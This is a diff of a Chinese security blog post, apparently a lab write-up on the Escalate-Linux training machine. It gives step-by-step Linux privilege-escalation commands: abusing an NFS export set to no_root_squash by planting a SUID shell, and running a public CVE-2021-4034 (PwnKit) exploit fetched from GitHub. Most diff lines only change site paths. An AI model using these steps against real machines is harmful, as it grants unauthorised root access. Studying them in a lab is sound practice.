 <h1 id="提权方式10：利用NFS提权"><a href="#提权方式10：利用NFS提权" class="headerlink" title="提权方式10：利用NFS提权"></a>提权方式10：利用NFS提权</h1><p>原理的简单解释：由于nfs一般是共享时使用的，因此存在登录的权限问题，在/etc/exports配置文件中，一般会出现两个配置选项，分别是no_root_squash和root_squash，Root Squashing（root_sqaush）参数阻止对连接到NFS卷的远程root用户具有root访问权限。远程根用户在连接时会分配一个用户“ nfsnobody ”，它具有最少的本地特权。如果 no_root_squash 选项开启的话”，并为远程用户授予root用户对所连接系统的访问权限。相信大家读到这个地方看出我们能利用的地方。<br>靶机中的/etc/exports配置信息</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/exports</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814223425209.png" alt="image-20220814223425209"></p>
+<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814223425209.png" alt="image-20220814223425209"></p>
 <p>靶机中配置的最后一行出现了任意用户都有读写权限，而且是no_root_squash（注意，一定是这个选项才能提权）。<br>在攻击机查询靶机的nfs挂载信息</p>
 <p>(我环境出问题了，用的别人的图片)</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">showmount -e 192.168.52.129</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/0b025df4c37c4d6ba08c22ba0a93279c.png" alt="在这里插入图片描述"></p>
+<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/0b025df4c37c4d6ba08c22ba0a93279c.png" alt="在这里插入图片描述"></p>
 <p>新建一个文件夹，并将靶机的文件夹挂载过来</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir nfs</span><br><span class="line">mount -t nfs 192.168.80.129:/home/user5 /tmp/ls</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/a5ae25216ef94237a74178af3ae0e93e.png" alt="在这里插入图片描述"></p>
+<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/a5ae25216ef94237a74178af3ae0e93e.png" alt="在这里插入图片描述"></p>
 <p>访问挂载的文件夹，发现文件同步过来了</p>
 <p>将攻击机的shell复制到这个文件夹中，那么就会在靶机上也有一个shell了</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/bin/sh .</span><br><span class="line">chmod u+sx sh</span><br></pre></td></tr></table></figure>
@@ -529,13 +529,13 @@
 <p>使用-p选项执行sh，成功拿到root权限</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/user5/sh -p</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/68c5df60bab64ffbadb1c7281a5d6487.png" alt="在这里插入图片描述"></p>
+<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/68c5df60bab64ffbadb1c7281a5d6487.png" alt="在这里插入图片描述"></p>
 <h1 id="提权方式11：利用cve-2021-4034提权"><a href="#提权方式11：利用cve-2021-4034提权" class="headerlink" title="提权方式11：利用cve-2021-4034提权"></a>提权方式11：利用cve-2021-4034提权</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/northeast-coder/p/15925463.html">SUID提权：CVE-2021-4034漏洞全解析 - 东北码农 - 博客园 (cnblogs.com)</a></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/berdav/CVE-2021-4034">https://github.com/berdav/CVE-2021-4034</a></p>
 <p>这里exp下载</p>
 <p>wget下载到靶机（记得进入tmp目录权限高点</p>
 <p>然后解压</p>
-<p><img src="/wan1/wan1/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814230049997.png" alt="image-20220814230049997"></p>
+<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814230049997.png" alt="image-20220814230049997"></p>
 <p>进入文件夹，make编译，然后执行./cve-2021-4034.sh</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd cve-2021-4034-mian</span><br><span class="line">make</span><br><span class="line">./cve-2021-4034.sh</span><br></pre></td></tr></table></figure>
 
@@ -555,11 +555,11 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/wan1/2022/08/14/Linux-suid%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/" rel="prev" title="Linux suid提权漏洞">
+    <a href="/2022/08/14/Linux-suid%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/" rel="prev" title="Linux suid提权漏洞">
       <i class="fa fa-chevron-left"></i> Linux suid提权漏洞
     </a></div>
       <div class="post-nav-item">
-    <a href="/wan1/2022/08/18/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%8A%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E/" rel="next" title="常见端口服务及可能存在的漏洞">
+    <a href="/2022/08/18/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%8A%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E/" rel="next" title="常见端口服务及可能存在的漏洞">
       常见端口服务及可能存在的漏洞 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
@@ -627,14 +627,14 @@
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <img class="site-author-image" itemprop="image" alt="十三"
-      src="/wan1/images/avatar.gif">
+      src="/images/avatar.gif">
   <p class="site-author-name" itemprop="name">十三</p>
   <div class="site-description" itemprop="description">潜心学习，不骄不躁</div>
 </div>
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-          <a href="/wan1/archives/">
+          <a href="/archives/">
         
           <span class="site-state-item-count">172</span>
           <span class="site-state-item-name">日志</span>
@@ -695,48 +695,48 @@
   </div>
 
   
-  <script src="/wan1/lib/anime.min.js"></script>
-  <script src="/wan1/lib/velocity/velocity.min.js"></script>
-  <script src="/wan1/lib/velocity/velocity.ui.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-<script src="/wan1/js/utils.js"></script>
+<script src="/js/utils.js"></script>
 
-<script src="/wan1/js/motion.js"></script>
-
-
-<script src="/wan1/js/schemes/pisces.js"></script>
+<script src="/js/motion.js"></script>
 
 
-<script src="/wan1/js/next-boot.js"></script>
+<script src="/js/schemes/pisces.js"></script>
 
 
-
-
-  
-
-
-
-
-  
-<script src="/wan1/js/local-search.js"></script>
-
-
-
-
-
-
-
-
-
+<script src="/js/next-boot.js"></script>
 
 
 
 
   
 
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
   
 
-<script src="/wan1/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-tsumiki"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-tsumiki"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
 <!-- 页面点击小红心 -->
 <script type="text/javascript" src="/js/src/clicklove.js"></script>
